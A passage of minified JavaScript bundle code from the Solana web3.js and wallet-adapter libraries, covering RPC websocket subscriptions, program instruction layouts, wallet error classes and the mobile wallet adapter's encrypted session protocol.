error:",e.message)}_wsOnClose(e){if(this._rpcWebSocketConnected=!1,this._rpcWebSocketGeneration=(this._rpcWebSocketGeneration+1)%Number.MAX_SAFE_INTEGER,this._rpcWebSocketIdleTimeout&&(clearTimeout(this._rpcWebSocketIdleTimeout),this._rpcWebSocketIdleTimeout=null),this._rpcWebSocketHeartbeat&&(clearInterval(this._rpcWebSocketHeartbeat),this._rpcWebSocketHeartbeat=null),e===1e3){this._updateSubscriptions();return}this._subscriptionCallbacksByServerSubscriptionId={},Object.entries(this._subscriptionsByHash).forEach(([t,r])=>{this._setSubscription(t,{...r,state:"pending"})})}_setSubscription(e,t){var i;const r=(i=this._subscriptionsByHash[e])==null?void 0:i.state;if(this._subscriptionsByHash[e]=t,r!==t.state){const s=this._subscriptionStateChangeCallbacksByHash[e];s&&s.forEach(o=>{try{o(t.state)}catch{}})}}_onSubscriptionStateChange(e,t){var s;const r=this._subscriptionHashByClientSubscriptionId[e];if(r==null)return()=>{};const i=(s=this._subscriptionStateChangeCallbacksByHash)[r]||(s[r]=new Set);return i.add(t),()=>{i.delete(t),i.size===0&&delete this._subscriptionStateChangeCallbacksByHash[r]}}async _updateSubscriptions(){if(Object.keys(this._subscriptionsByHash).length===0){this._rpcWebSocketConnected&&(this._rpcWebSocketConnected=!1,this._rpcWebSocketIdleTimeout=setTimeout(()=>{this._rpcWebSocketIdleTimeout=null;try{this._rpcWebSocket.close()}catch(r){r instanceof Error&&console.log(`Error when closing socket connection: ${r.message}`)}},500));return}if(this._rpcWebSocketIdleTimeout!==null&&(clearTimeout(this._rpcWebSocketIdleTimeout),this._rpcWebSocketIdleTimeout=null,this._rpcWebSocketConnected=!0),!this._rpcWebSocketConnected){this._rpcWebSocket.connect();return}const e=this._rpcWebSocketGeneration,t=()=>e===this._rpcWebSocketGeneration;await Promise.all(Object.keys(this._subscriptionsByHash).map(async r=>{const i=this._subscriptionsByHash[r];if(i!==void 0)switch(i.state){case"pending":case"unsubscribed":if(i.callbacks.size===0){delete this._subscriptionsByHash[r],i.state==="unsubscribed"&&delete this._subscriptionCallbacksByServerSubscriptionId[i.serverSubscriptionId],await this._updateSubscriptions();return}await(async()=>{const{args:s,method:o}=i;try{this._setSubscription(r,{...i,state:"subscribing"});const a=await this._rpcWebSocket.call(o,s);this._setSubscription(r,{...i,serverSubscriptionId:a,state:"subscribed"}),this._subscriptionCallbacksByServerSubscriptionId[a]=i.callbacks,await this._updateSubscriptions()}catch(a){if(console.error(`Received ${a instanceof Error?"":"JSON-RPC "}error calling \`${o}\``,{args:s,error:a}),!t())return;this._setSubscription(r,{...i,state:"pending"}),await this._updateSubscriptions()}})();break;case"subscribed":i.callbacks.size===0&&await(async()=>{const{serverSubscriptionId:s,unsubscribeMethod:o}=i;if(this._subscriptionsAutoDisposedByRpc.has(s))this._subscriptionsAutoDisposedByRpc.delete(s);else{this._setSubscription(r,{...i,state:"unsubscribing"}),this._setSubscription(r,{...i,state:"unsubscribing"});try{await this._rpcWebSocket.call(o,[s])}catch(a){if(a instanceof Error&&console.error(`${o} error:`,a.message),!t())return;this._setSubscription(r,{...i,state:"subscribed"}),await this._updateSubscriptions();return}}this._setSubscription(r,{...i,state:"unsubscribed"}),await this._updateSubscriptions()})();break}}))}_handleServerNotification(e,t){const r=this._subscriptionCallbacksByServerSubscriptionId[e];r!==void 0&&r.forEach(i=>{try{i(...t)}catch(s){console.error(s)}})}_wsOnAccountNotification(e){const{result:t,subscription:r}=de(e,ZO);this._handleServerNotification(r,[t.value,t.context])}_makeSubscription(e,t){const r=this._nextClientSubscriptionId++,i=RE([e.method,t]),s=this._subscriptionsByHash[i];return s===void 0?this._subscriptionsByHash[i]={...e,args:t,callbacks:new Set([e.callback]),state:"pending"}:s.callbacks.add(e.callback),this._subscriptionHashByClientSubscriptionId[r]=i,this._subscriptionDisposeFunctionsByClientSubscriptionId[r]=async()=>{delete this._subscriptionDisposeFunctionsByClientSubscriptionId[r],delete this._subscriptionHashByClientSubscriptionId[r];const o=this._subscriptionsByHash[i];Bt(o!==void 0,`Could not find a \`Subscription\` when tearing down client subscription #${r}`),o.callbacks.delete(e.callback),await this._updateSubscriptions()},this._updateSubscriptions(),r}onAccountChange(e,t,r){const{commitment:i,config:s}=St(r),o=this._buildArgs([e.toBase58()],i||this._commitment||"finalized","base64",s);return this._makeSubscription({callback:t,method:"accountSubscribe",unsubscribeMethod:"accountUnsubscribe"},o)}async removeAccountChangeListener(e){await this._unsubscribeClientSubscription(e,"account change")}_wsOnProgramAccountNotification(e){const{result:t,subscription:r}=de(e,XO);this._handleServerNotification(r,[{accountId:t.value.pubkey,accountInfo:t.value.account},t.context])}onProgramAccountChange(e,t,r,i){const{commitment:s,config:o}=St(r),a=this._buildArgs([e.toBase58()],s||this._commitment||"finalized","base64",o||(i?{filters:PE(i)}:void 0));return this._makeSubscription({callback:t,method:"programSubscribe",unsubscribeMethod:"programUnsubscribe"},a)}async removeProgramAccountChangeListener(e){await this._unsubscribeClientSubscription(e,"program account change")}onLogs(e,t,r){const i=this._buildArgs([typeof e=="object"?{mentions:[e.toString()]}:e],r||this._commitment||"finalized");return this._makeSubscription({callback:t,method:"logsSubscribe",unsubscribeMethod:"logsUnsubscribe"},i)}async removeOnLogsListener(e){await this._unsubscribeClientSubscription(e,"logs")}_wsOnLogsNotification(e){const{result:t,subscription:r}=de(e,C3);this._handleServerNotification(r,[t.value,t.context])}_wsOnSlotNotification(e){const{result:t,subscription:r}=de(e,t3);this._handleServerNotification(r,[t])}onSlotChange(e){return this._makeSubscription({callback:e,method:"slotSubscribe",unsubscribeMethod:"slotUnsubscribe"},[])}async removeSlotChangeListener(e){await this._unsubscribeClientSubscription(e,"slot change")}_wsOnSlotUpdatesNotification(e){const{result:t,subscription:r}=de(e,r3);this._handleServerNotification(r,[t])}onSlotUpdate(e){return this._makeSubscription({callback:e,method:"slotsUpdatesSubscribe",unsubscribeMethod:"slotsUpdatesUnsubscribe"},[])}async removeSlotUpdateListener(e){await this._unsubscribeClientSubscription(e,"slot update")}async _unsubscribeClientSubscription(e,t){const r=this._subscriptionDisposeFunctionsByClientSubscriptionId[e];r?await r():console.warn(`Ignored unsubscribe request because an active subscription with id \`${e}\` for '${t}' events could not be found.`)}_buildArgs(e,t,r,i){const s=t||this._commitment;if(s||r||i){let o={};r&&(o.encoding=r),s&&(o.commitment=s),i&&(o=Object.assign(o,i)),e.push(o)}return e}_buildArgsAtLeastConfirmed(e,t,r,i){const s=t||this._commitment;if(s&&!["confirmed","finalized"].includes(s))throw new Error("Using Connection with default commitment: `"+this._commitment+"`, but method requires at least `confirmed`");return this._buildArgs(e,t,r,i)}_wsOnSignatureNotification(e){const{result:t,subscription:r}=de(e,i3);t.value!=="receivedSignature"&&this._subscriptionsAutoDisposedByRpc.add(r),this._handleServerNotification(r,t.value==="receivedSignature"?[{type:"received"},t.context]:[{type:"status",result:t.value},t.context])}onSignature(e,t,r){const i=this._buildArgs([e],r||this._commitment||"finalized"),s=this._makeSubscription({callback:(o,a)=>{if(o.type==="status"){t(o.result,a);try{this.removeSignatureListener(s)}catch{}}},method:"signatureSubscribe",unsubscribeMethod:"signatureUnsubscribe"},i);return s}onSignatureWithOptions(e,t,r){const{commitment:i,...s}={...r,commitment:r&&r.commitment||this._commitment||"finalized"},o=this._buildArgs([e],i,void 0,s),a=this._makeSubscription({callback:(l,u)=>{t(l,u);try{this.removeSignatureListener(a)}catch{}},method:"signatureSubscribe",unsubscribeMethod:"signatureUnsubscribe"},o);return a}async removeSignatureListener(e){await this._unsubscribeClientSubscription(e,"signature result")}_wsOnRootNotification(e){const{result:t,subscription:r}=de(e,s3);this._handleServerNotification(r,[t])}onRootChange(e){return this._makeSubscription({callback:e,method:"rootSubscribe",unsubscribeMethod:"rootUnsubscribe"},[])}async removeRootChangeListener(e){await this._unsubscribeClientSubscription(e,"root change")}}Object.freeze({CreateLookupTable:{index:0,layout:_e([be("instruction"),Ul("recentSlot"),it("bumpSeed")])},FreezeLookupTable:{index:1,layout:_e([be("instruction")])},ExtendLookupTable:{index:2,layout:_e([be("instruction"),Ul(),tr(He(),ra(be(),-8),"addresses")])},DeactivateLookupTable:{index:3,layout:_e([be("instruction")])},CloseLookupTable:{index:4,layout:_e([be("instruction")])}});new Se("AddressLookupTab1e1111111111111111111111111");Object.freeze({RequestUnits:{index:0,layout:_e([it("instruction"),be("units"),be("additionalFee")])},RequestHeapFrame:{index:1,layout:_e([it("instruction"),be("bytes")])},SetComputeUnitLimit:{index:2,layout:_e([it("instruction"),be("units")])},SetComputeUnitPrice:{index:3,layout:_e([it("instruction"),Ul("microLamports")])}});new Se("ComputeBudget111111111111111111111111111111");_e([it("numSignatures"),it("padding"),Fr("signatureOffset"),Fr("signatureInstructionIndex"),Fr("publicKeyOffset"),Fr("publicKeyInstructionIndex"),Fr("messageDataOffset"),Fr("messageDataSize"),Fr("messageInstructionIndex")]);new Se("Ed25519SigVerify111111111111111111111111111");jD.utils.isValidPrivateKey;_e([it("numSignatures"),Fr("signatureOffset"),it("signatureInstructionIndex"),Fr("ethAddressOffset"),it("ethAddressInstructionIndex"),Fr("messageDataOffset"),Fr("messageDataSize"),it("messageInstructionIndex"),Rt(20,"ethAddress"),Rt(64,"signature"),it("recoveryId")]);new Se("KeccakSecp256k11111111111111111111111111111");var vx;new Se("StakeConfig11111111111111111111111111111111");class _x{constructor(e,t,r){this.unixTimestamp=void 0,this.epoch=void 0,this.custodian=void 0,this.unixTimestamp=e,this.epoch=t,this.custodian=r}}vx=_x;_x.default=new vx(0,0,Se.default);Object.freeze({Initialize:{index:0,layout:_e([be("instruction"),HD(),qD()])},Authorize:{index:1,layout:_e([be("instruction"),He("newAuthorized"),be("stakeAuthorizationType")])},Delegate:{index:2,layout:_e([be("instruction")])},Split:{index:3,layout:_e([be("instruction"),Ar("lamports")])},Withdraw:{index:4,layout:_e([be("instruction"),Ar("lamports")])},Deactivate:{index:5,layout:_e([be("instruction")])},Merge:{index:7,layout:_e([be("instruction")])},AuthorizeWithSeed:{index:8,layout:_e([be("instruction"),He("newAuthorized"),be("stakeAuthorizationType"),ul("authoritySeed"),He("authorityOwner")])}});new Se("Stake11111111111111111111111111111111111111");Object.freeze({InitializeAccount:{index:0,layout:_e([be("instruction"),KD()])},Authorize:{index:1,layout:_e([be("instruction"),He("newAuthorized"),be("voteAuthorizationType")])},Withdraw:{index:3,layout:_e([be("instruction"),Ar("lamports")])},UpdateValidatorIdentity:{index:4,layout:_e([be("instruction")])},AuthorizeWithSeed:{index:10,layout:_e([be("instruction"),GD()])}});new Se("Vote111111111111111111111111111111111111111");new Se("Va1idator1nfo111111111111111111111111111111");se({name:ue(),website:xe(ue()),details:xe(ue()),iconUrl:xe(ue()),keybaseUsername:xe(ue())});new Se("Vote111111111111111111111111111111111111111");_e([He("nodePubkey"),He("authorizedWithdrawer"),it("commission"),Mn(),tr(_e([Mn("slot"),be("confirmationCount")]),ra(be(),-8),"votes"),it("rootSlotValid"),Mn("rootSlot"),Mn(),tr(_e([Mn("epoch"),He("authorizedVoter")]),ra(be(),-8),"authorizedVoters"),_e([tr(_e([He("authorizedPubkey"),Mn("epochOfLastAuthorizedSwitch"),Mn("targetEpoch")]),32,"buf"),Mn("idx"),it("isEmpty")],"priorVoters"),Mn(),tr(_e([Mn("epoch"),Mn("credits"),Mn("prevCredits")]),ra(be(),-8),"epochCredits"),_e([Mn("slot"),Mn("timestamp")],"lastTimestamp")]);const Ex=Y.createContext({});function M3(){return Y.useContext(Ex)}const N3=({children:n,endpoint:e,config:t={commitment:"confirmed"}})=>{const r=Y.useMemo(()=>new hv(e,t),[e,t]);return ae.createElement(Ex.Provider,{value:{connection:r}},n)};var Ix={exports:{}};(function(n){var e=Object.prototype.hasOwnProperty,t="~";function r(){}Object.create&&(r.prototype=Object.create(null),new r().__proto__||(t=!1));function i(l,u,h){this.fn=l,this.context=u,this.once=h||!1}function s(l,u,h,f,p){if(typeof h!="function")throw new TypeError("The listener must be a function");var w=new i(h,f||l,p),x=t?t+u:u;return l._events[x]?l._events[x].fn?l._events[x]=[l._events[x],w]:l._events[x].push(w):(l._events[x]=w,l._eventsCount++),l}function o(l,u){--l._eventsCount===0?l._events=new r:delete l._events[u]}function a(){this._events=new r,this._eventsCount=0}a.prototype.eventNames=function(){var u=[],h,f;if(this._eventsCount===0)return u;for(f in h=this._events)e.call(h,f)&&u.push(t?f.slice(1):f);return Object.getOwnPropertySymbols?u.concat(Object.getOwnPropertySymbols(h)):u},a.prototype.listeners=function(u){var h=t?t+u:u,f=this._events[h];if(!f)return[];if(f.fn)return[f.fn];for(var p=0,w=f.length,x=new Array(w);p<w;p++)x[p]=f[p].fn;return x},a.prototype.listenerCount=function(u){var h=t?t+u:u,f=this._events[h];return f?f.fn?1:f.length:0},a.prototype.emit=function(u,h,f,p,w,x){var k=t?t+u:u;if(!this._events[k])return!1;var I=this._events[k],A=arguments.length,b,E;if(I.fn){switch(I.once&&this.removeListener(u,I.fn,void 0,!0),A){case 1:return I.fn.call(I.context),!0;case 2:return I.fn.call(I.context,h),!0;case 3:return I.fn.call(I.context,h,f),!0;case 4:return I.fn.call(I.context,h,f,p),!0;case 5:return I.fn.call(I.context,h,f,p,w),!0;case 6:return I.fn.call(I.context,h,f,p,w,x),!0}for(E=1,b=new Array(A-1);E<A;E++)b[E-1]=arguments[E];I.fn.apply(I.context,b)}else{var O=I.length,W;for(E=0;E<O;E++)switch(I[E].once&&this.removeListener(u,I[E].fn,void 0,!0),A){case 1:I[E].fn.call(I[E].context);break;case 2:I[E].fn.call(I[E].context,h);break;case 3:I[E].fn.call(I[E].context,h,f);break;case 4:I[E].fn.call(I[E].context,h,f,p);break;default:if(!b)for(W=1,b=new Array(A-1);W<A;W++)b[W-1]=arguments[W];I[E].fn.apply(I[E].context,b)}}return!0},a.prototype.on=function(u,h,f){return s(this,u,h,f,!1)},a.prototype.once=function(u,h,f){return s(this,u,h,f,!0)},a.prototype.removeListener=function(u,h,f,p){var w=t?t+u:u;if(!this._events[w])return this;if(!h)return o(this,w),this;var x=this._events[w];if(x.fn)x.fn===h&&(!p||x.once)&&(!f||x.context===f)&&o(this,w);else{for(var k=0,I=[],A=x.length;k<A;k++)(x[k].fn!==h||p&&!x[k].once||f&&x[k].context!==f)&&I.push(x[k]);I.length?this._events[w]=I.length===1?I[0]:I:o(this,w)}return this},a.prototype.removeAllListeners=function(u){var h;return u?(h=t?t+u:u,this._events[h]&&o(this,h)):(this._events=new r,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=t,a.EventEmitter=a,n.exports=a})(Ix);var P3=Ix.exports;const L3=Eo(P3);class kn extends Error{constructor(e,t){super(e),this.error=t}}class so extends kn{constructor(){super(...arguments),this.name="WalletNotReadyError"}}class D3 extends kn{constructor(){super(...arguments),this.name="WalletLoadError"}}class hl extends kn{constructor(){super(...arguments),this.name="WalletConfigError"}}class qs extends kn{constructor(){super(...arguments),this.name="WalletConnectionError"}}class Op extends kn{constructor(){super(...arguments),this.name="WalletDisconnectedError"}}class fv extends kn{constructor(){super(...arguments),this.name="WalletDisconnectionError"}}class Ko extends kn{constructor(){super(...arguments),this.name="WalletAccountError"}}class Vl extends kn{constructor(){super(...arguments),this.name="WalletPublicKeyError"}}class sn extends kn{constructor(){super(...arguments),this.name="WalletNotConnectedError"}}class es extends kn{constructor(){super(...arguments),this.name="WalletSendTransactionError"}}class ai extends kn{constructor(){super(...arguments),this.name="WalletSignTransactionError"}}class Bp extends kn{constructor(){super(...arguments),this.name="WalletSignMessageError"}}class BE extends kn{constructor(){super(...arguments),this.name="WalletSignInError"}}var Ve;(function(n){n.Installed="Installed",n.NotDetected="NotDetected",n.Loadable="Loadable",n.Unsupported="Unsupported"})(Ve||(Ve={}));class Sx extends L3{get connected(){return!!this.publicKey}async autoConnect(){await this.connect()}async prepareTransaction(e,t,r={}){const i=this.publicKey;if(!i)throw new sn;return e.feePayer=e.feePayer||i,e.recentBlockhash=e.recentBlockhash||(await t.getLatestBlockhash({commitment:r.preflightCommitment,minContextSlot:r.minContextSlot})).blockhash,e}}function Tx(n){if(typeof window>"u"||typeof document>"u")return;const e=[];function t(){if(n())for(const s of e)s()}const r=setInterval(t,1e3);e.push(()=>clearInterval(r)),document.readyState==="loading"&&(document.addEventListener("DOMContentLoaded",t,{once:!0}),e.push(()=>document.removeEventListener("DOMContentLoaded",t))),document.readyState!=="complete"&&(window.addEventListener("load",t,{once:!0}),e.push(()=>window.removeEventListener("load",t))),t()}function q0(){if(!navigator)return!1;const n=navigator.userAgent.toLowerCase(),e=n.includes("iphone")||n.includes("ipad"),t=n.includes("safari");return e&&t}function ts(n){return"version"in n}class O3 extends Sx{async sendTransaction(e,t,r={}){let i=!0;try{if(ts(e)){if(!this.supportedTransactionVersions)throw new es("Sending versioned transactions isn't supported by this wallet");if(!this.supportedTransactionVersions.has(e.version))throw new es(`Sending transaction version ${e.version} isn't supported by this wallet`);try{e=await this.signTransaction(e);const s=e.serialize();return await t.sendRawTransaction(s,r)}catch(s){throw s instanceof ai?(i=!1,s):new es(s==null?void 0:s.message,s)}}else try{const{signers:s,...o}=r;e=await this.prepareTransaction(e,t,o),s!=null&&s.length&&e.partialSign(...s),e=await this.signTransaction(e);const a=e.serialize();return await t.sendRawTransaction(a,o)}catch(s){throw s instanceof ai?(i=!1,s):new es(s==null?void 0:s.message,s)}}catch(s){throw i&&this.emit("error",s),s}}async signAllTransactions(e){for(const r of e)if(ts(r)){if(!this.supportedTransactionVersions)throw new ai("Signing versioned transactions isn't supported by this wallet");if(!this.supportedTransactionVersions.has(r.version))throw new ai(`Signing transaction version ${r.version} isn't supported by this wallet`)}const t=[];for(const r of e)t.push(await this.signTransaction(r));return t}}class dv extends O3{}class B3 extends dv{}const Zi="solana:signAndSendTransaction",fm="solana:signIn",qa="solana:signMessage",In="solana:signTransaction",pv="standard:connect",K0="standard:disconnect",gv="standard:events";function U3(n){return pv in n.features&&gv in n.features&&(Zi in n.features||In in n.features)}class UE extends kn{constructor(){super(...arguments),this.name="WalletNotSelectedError"}}const j3=[],Up={autoConnect:!1,connecting:!1,connected:!1,disconnecting:!1,select(){ri("call","select")},connect(){return Promise.reject(ri("call","connect"))},disconnect(){return Promise.reject(ri("call","disconnect"))},sendTransaction(){return Promise.reject(ri("call","sendTransaction"))},signTransaction(){return Promise.reject(ri("call","signTransaction"))},signAllTransactions(){return Promise.reject(ri("call","signAllTransactions"))},signMessage(){return Promise.reject(ri("call","signMessage"))},signIn(){return Promise.reject(ri("call","signIn"))}};Object.defineProperty(Up,"wallets",{get(){return ri("read","wallets"),j3}});Object.defineProperty(Up,"wallet",{get(){return ri("read","wallet"),null}});Object.defineProperty(Up,"publicKey",{get(){return ri("read","publicKey"),null}});function ri(n,e){const t=new Error(`You have tried to ${n} "${e}" on a WalletContext without providing one. Make sure to render a WalletProvider as an ancestor of the component that uses WalletContext.`);return console.error(t),t}const Ax=Y.createContext(Up);function cc(){return Y.useContext(Ax)}function V3(n,e){const t=Y.useState(()=>{try{const s=localStorage.getItem(n);if(s)return JSON.parse(s)}catch(s){typeof window<"u"&&console.error(s)}return e}),r=t[0],i=Y.useRef(!0);return Y.useEffect(()=>{if(i.current){i.current=!1;return}try{r===null?localStorage.removeItem(n):localStorage.setItem(n,JSON.stringify(r))}catch(s){typeof window<"u"&&console.error(s)}},[r,n]),t}function dm(n){switch(n){case"processed":case"confirmed":case"finalized":case void 0:return n;case"recent":return"processed";case"single":case"singleGossip":return"confirmed";case"max":case"root":return"finalized";default:return}}const G0="solana:mainnet",bx="solana:devnet",xx="solana:testnet",F3="solana:localnet",z3="https://api.mainnet-beta.solana.com";function W3(n){return n.includes(z3)?G0:/\bdevnet\b/i.test(n)?bx:/\btestnet\b/i.test(n)?xx:/\blocalhost\b/i.test(n)||/\b127\.0\.0\.1\b/.test(n)?F3:G0}function $3(n){let e=`${n.domain} wants you to sign in with your Solana account:
`;e+=`${n.address}`,n.statement&&(e+=`

${n.statement}`);const t=[];if(n.uri&&t.push(`URI: ${n.uri}`),n.version&&t.push(`Version: ${n.version}`),n.chainId&&t.push(`Chain ID: ${n.chainId}`),n.nonce&&t.push(`Nonce: ${n.nonce}`),n.issuedAt&&t.push(`Issued At: ${n.issuedAt}`),n.expirationTime&&t.push(`Expiration Time: ${n.expirationTime}`),n.notBefore&&t.push(`Not Before: ${n.notBefore}`),n.requestId&&t.push(`Request ID: ${n.requestId}`),n.resources){t.push("Resources:");for(const r of n.resources)t.push(`- ${r}`)}return t.length&&(e+=`

${t.join(`
`)}`),e}const ds={ERROR_ASSOCIATION_PORT_OUT_OF_RANGE:"ERROR_ASSOCIATION_PORT_OUT_OF_RANGE",ERROR_REFLECTOR_ID_OUT_OF_RANGE:"ERROR_REFLECTOR_ID_OUT_OF_RANGE",ERROR_FORBIDDEN_WALLET_BASE_URL:"ERROR_FORBIDDEN_WALLET_BASE_URL",ERROR_SECURE_CONTEXT_REQUIRED:"ERROR_SECURE_CONTEXT_REQUIRED",ERROR_SESSION_CLOSED:"ERROR_SESSION_CLOSED",ERROR_SESSION_TIMEOUT:"ERROR_SESSION_TIMEOUT",ERROR_WALLET_NOT_FOUND:"ERROR_WALLET_NOT_FOUND",ERROR_INVALID_PROTOCOL_VERSION:"ERROR_INVALID_PROTOCOL_VERSION"};class ps extends Error{constructor(...e){const[t,r,i]=e;super(r),this.code=t,this.data=i,this.name="SolanaMobileWalletAdapterError"}}class kx extends Error{constructor(...e){const[t,r,i,s]=e;super(i),this.code=r,this.data=s,this.jsonRpcMessageId=t,this.name="SolanaMobileWalletAdapterProtocolError"}}function hn(n,e,t,r){function i(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(h){try{u(r.next(h))}catch(f){o(f)}}function l(h){try{u(r.throw(h))}catch(f){o(f)}}function u(h){h.done?s(h.value):i(h.value).then(a,l)}u((r=r.apply(n,e||[])).next())})}function pm(n,e){return hn(this,void 0,void 0,function*(){const t=yield crypto.subtle.exportKey("raw",n),r=yield crypto.subtle.sign({hash:"SHA-256",name:"ECDSA"},e,t),i=new Uint8Array(t.byteLength+r.byteLength);return i.set(new Uint8Array(t),0),i.set(new Uint8Array(r),t.byteLength),i})}function H3(n){return window.btoa(n)}function q3(n){return $3(n)}function K3(n){return H3(q3(n))}const G3="solana:signTransactions",jE="solana:cloneAuthorization";function Q3(n,e){return new Proxy({},{get(t,r){return t[r]==null&&(t[r]=function(i){return hn(this,void 0,void 0,function*(){const{method:s,params:o}=Y3(r,i,n),a=yield e(s,o);return s==="authorize"&&o.sign_in_payload&&!a.sign_in_result&&(a.sign_in_result=yield J3(o.sign_in_payload,a,e)),Z3(r,a,n)})}),t[r]},defineProperty(){return!1},deleteProperty(){return!1}})}function Y3(n,e,t){let r=e,i=n.toString().replace(/[A-Z]/g,s=>`_${s.toLowerCase()}`).toLowerCase();switch(n){case"authorize":{let{chain:s}=r;if(t==="legacy"){switch(s){case"solana:testnet":{s="testnet";break}case"solana:devnet":{s="devnet";break}case"solana:mainnet":{s="mainnet-beta";break}default:s=r.cluster}r.cluster=s}else{switch(s){case"testnet":case"devnet":{s=`solana:${s}`;break}case"mainnet-beta":{s="solana:mainnet";break}}r.chain=s}}case"reauthorize":{const{auth_token:s,identity:o}=r;if(s)switch(t){case"legacy":{i="reauthorize",r={auth_token:s,identity:o};break}default:{i="authorize";break}}break}}return{method:i,params:r}}function Z3(n,e,t){switch(n){case"getCapabilities":{const r=e;switch(t){case"legacy":{const i=[G3];return r.supports_clone_authorization===!0&&i.push(jE),Object.assign(Object.assign({},r),{features:i})}case"v1":return Object.assign(Object.assign({},r),{supports_sign_and_send_transactions:!0,supports_clone_authorization:r.features.includes(jE)})}}}return e}function J3(n,e,t){var r;return hn(this,void 0,void 0,function*(){const i=(r=n.domain)!==null&&r!==void 0?r:window.location.host,s=e.accounts[0].address,o=K3(Object.assign(Object.assign({},n),{domain:i,address:s})),a=yield t("sign_messages",{addresses:[s],payloads:[o]});return{address:s,signed_message:o,signature:a.signed_payloads[0].slice(o.length)}})}const Go=4;function X3(n){if(n>=4294967296)throw new Error("Outbound sequence number overflow. The maximum sequence number is 32-bytes.");const e=new ArrayBuffer(Go);return new DataView(e).setUint32(0,n,!1),new Uint8Array(e)}const Q0=12,Cx=65;function eB(n,e,t){return hn(this,void 0,void 0,function*(){const r=X3(e),i=new Uint8Array(Q0);crypto.getRandomValues(i);const s=yield crypto.subtle.encrypt(Mx(r,i),t,new TextEncoder().encode(n)),o=new Uint8Array(r.byteLength+i.byteLength+s.byteLength);return o.set(new Uint8Array(r),0),o.set(new Uint8Array(i),r.byteLength),o.set(new Uint8Array(s),r.byteLength+i.byteLength),o})}function Rx(n,e){return hn(this,void 0,void 0,function*(){const t=n.slice(0,Go),r=n.slice(Go,Go+Q0),i=n.slice(Go+Q0),s=yield crypto.subtle.decrypt(Mx(t,r),e,i);return tB().decode(s)})}function Mx(n,e){return{additionalData:n,iv:e,name:"AES-GCM",tagLength:128}}let gm;function tB(){return gm===void 0&&(gm=new TextDecoder("utf-8")),gm}function nB(){return hn(this,void 0,void 0,function*(){return yield crypto.subtle.generateKey({name:"ECDSA",namedCurve:"P-256"},!1,["sign"])})}function mm(){return hn(this,void 0,void 0,function*(){return yield crypto.subtle.generateKey({name:"ECDH",namedCurve:"P-256"},!1,["deriveKey","deriveBits"])})}function rB(n,e){return hn(this,void 0,void 0,function*(){const t=JSON.stringify(n),r=n.id;return eB(t,r,e)})}function iB(n,e){return hn(this,void 0,void 0,function*(){const t=yield Rx(n,e),r=JSON.parse(t);if(Object.hasOwnProperty.call(r,"error"))throw new kx(r.id,r.error.code,r.error.message);return r})}function sB(n,e,t){return hn(this,void 0,void 0,function*(){const[r,i]=yield Promise.all([crypto.subtle.exportKey("raw",e),crypto.subtle.importKey("raw",n.slice(0,Cx),{name:"ECDH",namedCurve:"P-256"},!1,[])]),s=yield crypto.subtle.deriveBits({name:"ECDH",public:i},t,256),o=yield crypto.subtle.importKey("raw",s,"HKDF",!1,["deriveKey"]);return yield crypto.subtle.deriveKey({name:"HKDF",hash:"SHA-256",salt:new Uint8Array(r),info:new Uint8Array},o,{name:"AES-GCM",length:128},!1,["encrypt","decrypt"])})}function oB(n,e){return hn(this,void 0,void 0,function*(){const t=yield Rx(n,e),r=JSON.parse(t);let i="legacy";if(Object.hasOwnProperty.call(r,"v"))switch(r.v){case 1:case"1":case"v1":i="v1";break;case"legacy":i="legacy";break;default:throw new ps(ds.ERROR_INVALID_PROTOCOL_VERSION,`Unknown/unsupported protocol version: ${r.v}`)}return{protocol_version:i}})}function aB(){return Nx(49152+Math.floor(Math.random()*(65535-49152+1)))}function Nx(n){if(n<49152||n>65535)throw new ps(ds.ERROR_ASSOCIATION_PORT_OUT_OF_RANGE,`Association port number must be between 49152 and 65535. ${n} given.`,{port:n});return n}function lB(n){let e="";const t=new Uint8Array(n),r=t.byteLength;for(let i=0;i<r;i++)e+=String.fromCharCode(t[i]);return window.btoa(e)}function cB(n){return n.replace(/[/+=]/g,e=>({"/":"_","+":"-","=":"."})[e])}const uB="solana-wallet";function VE(n){return n.replace(/(^\/+|\/+$)/g,"").split("/")}function hB(n,e){let t=null;if(e){try{t=new URL(e)}catch{}if((t==null?void 0:t.protocol)!=="https:")throw new ps(ds.ERROR_FORBIDDEN_WALLET_BASE_URL,"Base URLs supplied by wallets must be valid `https` URLs")}t||(t=new URL(`${uB}:/`));const r=n.startsWith("/")?n:[...VE(t.pathname),...VE(n)].join("/");return new URL(r,t)}function fB(n,e,t,r=["v1"]){return hn(this,void 0,void 0,function*(){const i=Nx(e),s=yield crypto.subtle.exportKey("raw",n),o=lB(s),a=hB("v1/associate/local",t);return a.searchParams.set("association",cB(o)),a.searchParams.set("port",`${i}`),r.forEach(l=>{a.searchParams.set("v",l)}),a})}const Rd={Firefox:0,Other:1};function dB(){return navigator.userAgent.indexOf("Firefox/")!==-1?Rd.Firefox:Rd.Other}function pB(){return new Promise((n,e)=>{function t(){clearTimeout(i),window.removeEventListener("blur",r)}function r(){t(),n()}window.addEventListener("blur",r);const i=setTimeout(()=>{t(),e()},2e3)})}let Fc=null;function gB(n){Fc==null&&(Fc=document.createElement("iframe"),Fc.style.display="none",document.body.appendChild(Fc)),Fc.contentWindow.location.href=n.toString()}function mB(n){return hn(this,void 0,void 0,function*(){if(n.protocol==="https:")window.location.assign(n);else try{const e=dB();switch(e){case Rd.Firefox:gB(n);break;case Rd.Other:{const t=pB();window.location.assign(n),yield t;break}default:}}catch{throw new ps(ds.ERROR_WALLET_NOT_FOUND,"Found no installed wallet that supports the mobile wallet protocol.")}})}function yB(n,e){return hn(this,void 0,void 0,function*(){const t=aB(),r=yield fB(n,t,e);return yield mB(r),t})}const FE={retryDelayScheduleMs:[150,150,200,500,500,750,750,1e3],timeoutMs:3e4},wB="com.solana.mobilewalletadapter.v1";function vB(){if(typeof window>"u"||window.isSecureContext!==!0)throw new ps(ds.ERROR_SECURE_CONTEXT_REQUIRED,"The mobile wallet adapter protocol must be used in a secure context (`https`).")}function _B(n){let e;try{e=new URL(n)}catch{throw new ps(ds.ERROR_FORBIDDEN_WALLET_BASE_URL,"Invalid base URL supplied by wallet")}if(e.protocol!=="https:")throw new ps(ds.ERROR_FORBIDDEN_WALLET_BASE_URL,"Base URLs supplied by wallets must be valid `https` URLs")}function zE(n){return new DataView(n).getUint32(0,!1)}function EB(n,e){return hn(this,void 0,void 0,function*(){vB();const t=yield nB(),i=`ws://localhost:${yield yB(t.publicKey,e==null?void 0:e.baseUri)}/solana-wallet`;let s;const 